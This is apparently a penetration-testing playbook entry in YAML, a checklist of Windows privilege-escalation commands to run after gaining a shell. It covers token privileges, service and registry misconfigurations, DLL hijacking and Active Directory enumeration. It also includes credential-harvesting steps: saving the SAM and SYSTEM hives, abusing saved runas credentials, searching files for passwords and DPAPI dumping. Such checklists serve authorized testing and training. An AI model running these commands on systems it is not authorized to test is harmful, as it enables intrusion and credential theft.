---
display_name: "Windows PrivEsc Checklist"
description: |
  Windows privilege escalation checklist — run these fast checks top to bottom after landing a shell.
  Each positive result links to the specific technique entry. Stop and exploit the first win you find.
commands:
  - have: Shell
    cmd: |
      # ════════════════════════════════════════════════════════════════
      # PHASE 1 — WHO AM I / SITUATIONAL AWARENESS
      # ════════════════════════════════════════════════════════════════

      # current user, domain membership, SID
      whoami /all

      # local groups — look for Administrators, Backup Operators, Remote Desktop Users
      net localgroup

      # check if domain-joined — if yes, pivot to AD attack surface
      systeminfo | findstr /i "domain"

      # OS version and patch level — needed for kernel exploit selection
      systeminfo | findstr /i "os name\|os version\|hotfix"

      # environment variables — may expose credentials, paths, or app config
      set

      # ════════════════════════════════════════════════════════════════
      # PHASE 2 — TOKEN PRIVILEGES  →  Token-Impersonation.md / Windows-Potato-Attacks.md
      # ════════════════════════════════════════════════════════════════

      # list enabled token privileges — check for any of the below
      whoami /priv

      # SeImpersonatePrivilege → PrintSpoofer / RoguePotato / GodPotato  →  Windows-Potato-Attacks.md
      # SeAssignPrimaryTokenPrivilege → same potato attacks
      # SeBackupPrivilege → read any file, dump SAM/NTDS  →  Windows-Post-Exploitation.md
      # SeRestorePrivilege → write any file, replace binaries
      # SeDebugPrivilege → dump LSASS  →  Windows-Post-Exploitation.md
      # SeTakeOwnershipPrivilege → take ownership of any object
      # SeLoadDriverPrivilege → load a malicious kernel driver  →  Windows-Kernel-Exploit.md
      # SeManageVolumePrivilege → write to any volume (shadow copy abuse)

      # quick check — does SeImpersonatePrivilege appear?
      whoami /priv | findstr /i "impersonate\|assignprimarytoken"

      # ════════════════════════════════════════════════════════════════
      # PHASE 3 — SERVICES  →  Windows-Service-Exploit.md
      # ════════════════════════════════════════════════════════════════

      # find unquoted service paths with spaces that auto-start (not in C:\Windows)
      wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "C:\windows\\" |findstr /i /v """"

      # check which services the current user can modify
      accesschk.exe /accepteula -ucqv "Authenticated Users" * /svc 2>nul
      accesschk.exe /accepteula -uwcqv sec_user * /svc 2>nul

      # show full config of a suspicious service (binary path, run-as account)
      sc qc VulnService

      # check write permissions on service binary directories
      icacls "C:\Program Files\SuspiciousApp"

      # ════════════════════════════════════════════════════════════════
      # PHASE 4 — REGISTRY  →  Windows-Registry-Exploit.md / Windows-AlwaysInstallElevated.md
      # ════════════════════════════════════════════════════════════════

      # AlwaysInstallElevated — both keys must be 1 for MSI to run as SYSTEM
      reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
      reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

      # autorun programs — check if any executable is writable  →  Windows-Registry-Exploit.md
      reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
      reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

      # check write permission on an autorun binary path
      icacls "C:\Path\To\AutorunApp.exe"

      # ════════════════════════════════════════════════════════════════
      # PHASE 5 — SCHEDULED TASKS  →  Windows-Registry-Exploit.md
      # ════════════════════════════════════════════════════════════════

      # list all scheduled tasks with their run-as user and executable path
      schtasks /query /fo LIST /v | findstr /i "task name\|run as\|task to run"

      # look for tasks running as SYSTEM whose script/binary is writable
      icacls "C:\Path\To\ScheduledTask.ps1"

      # ════════════════════════════════════════════════════════════════
      # PHASE 6 — STORED CREDENTIALS  →  Windows-Post-Exploitation.md / DPAPI-Extraction.md
      # ════════════════════════════════════════════════════════════════

      # stored credentials in Windows Credential Manager — may contain plaintext passwords
      cmdkey /list

      # use stored cmdkey credentials without knowing the password
      runas /savecred /user:DOMAIN\targetuser "cmd.exe /c whoami > C:\Temp\out.txt"

      # search common credential files
      dir /s /b %APPDATA%\*.txt %APPDATA%\*.xml %APPDATA%\*.ini 2>nul
      findstr /si "password\|passwd\|pwd\|secret\|credential" C:\*.xml C:\*.ini C:\*.txt 2>nul

      # unattended install files — often contain base64-encoded admin passwords
      dir /s /b C:\sysprep.inf C:\sysprep\sysprep.xml C:\Windows\Panther\Unattend.xml 2>nul

      # SAM database backup — crackable offline  →  Windows-Post-Exploitation.md
      reg save HKLM\SAM C:\Temp\SAM
      reg save HKLM\SYSTEM C:\Temp\SYSTEM

      # DPAPI — browser passwords, vault creds  →  DPAPI-Extraction.md
      nxc smb 10.10.10.27 -u sec_user -p 'P@ssw0rd' --dpapi

      # ════════════════════════════════════════════════════════════════
      # PHASE 7 — DLL HIJACKING  →  Windows-DLL-Hijack.md
      # ════════════════════════════════════════════════════════════════

      # find processes running as SYSTEM or high-integrity
      tasklist /v | findstr /i "system\|administrator"

      # use Procmon or PowerShell to find missing DLLs loaded by a privileged process
      # look for "NAME NOT FOUND" results in directories writable by current user

      # check if any directory in PATH is writable (DLL planting opportunity)
      for %A in ("%path:;=";"%") do ( cmd /c icacls "%~A" 2>nul | findstr /i "Everyone\|BUILTIN\|Users" )

      # ════════════════════════════════════════════════════════════════
      # PHASE 8 — UAC BYPASS  →  Windows-UAC-Bypass.md
      # ════════════════════════════════════════════════════════════════

      # check UAC level — if not NotifyMe or higher, bypass may be possible
      reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
      reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA

      # check if current user is in local Administrators (medium integrity shell — bypass needed)
      net localgroup Administrators | findstr /i "%USERNAME%"

      # ════════════════════════════════════════════════════════════════
      # PHASE 9 — INSTALLED SOFTWARE / KERNEL EXPLOITS  →  Windows-Kernel-Exploit.md
      # ════════════════════════════════════════════════════════════════

      # list installed software — look for vulnerable versions (e.g. old Splunk, TeamViewer)
      wmic product get name,version

      # missing patches — compare against known exploit list (MS16-032, CVE-2021-36934 HiveNightmare, etc.)
      wmic qfe get hotfixid | sort

      # quick check for HiveNightmare (CVE-2021-36934) — readable SAM by non-admin
      icacls C:\Windows\System32\config\SAM | findstr /i "Users\|Everyone"

      # ════════════════════════════════════════════════════════════════
      # PHASE 10 — NETWORK / INTERNAL SERVICES
      # ════════════════════════════════════════════════════════════════

      # listening ports — internal services not exposed externally may be exploitable
      netstat -ano | findstr "LISTENING"

      # identify process behind an interesting port
      tasklist /fi "pid eq <PID>"

      # ARP table — discover other hosts on the network for pivoting
      arp -a

      # ════════════════════════════════════════════════════════════════
      # PHASE 11 — AD-SPECIFIC (if domain-joined)  →  ACL-Abuse.md / BloodHound.md
      # ════════════════════════════════════════════════════════════════

      # check domain groups — are you in any privileged AD groups?
      net user %USERNAME% /domain

      # look for AD misconfigs via BloodHound collection
      .\SharpHound.exe -c All --zip

      # find AD ACL misconfigs with PowerView
      Import-Module .\PowerView.ps1
      Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "$env:USERNAME"}

      # ════════════════════════════════════════════════════════════════
      # PHASE 12 — AUTOMATED SCANNERS (run last — noisy)
      # ════════════════════════════════════════════════════════════════

      # WinPEAS — comprehensive automated PrivEsc enumeration
      .\winpeas.exe

      # Seatbelt — targeted security checks (less noisy than WinPEAS)
      .\Seatbelt.exe -group=all

      # PowerUp — PowerShell PrivEsc checks (services, registry, DLLs)
      Import-Module .\PowerUp.ps1
      Invoke-AllChecks
phase:
  - PrivEsc
target_os:
  - Windows
services: []
techniques: []
references:
  - https://github.com/peass-ng/PEASS-ng
  - https://github.com/GhostPack/Seatbelt
  - https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
  - https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html
---
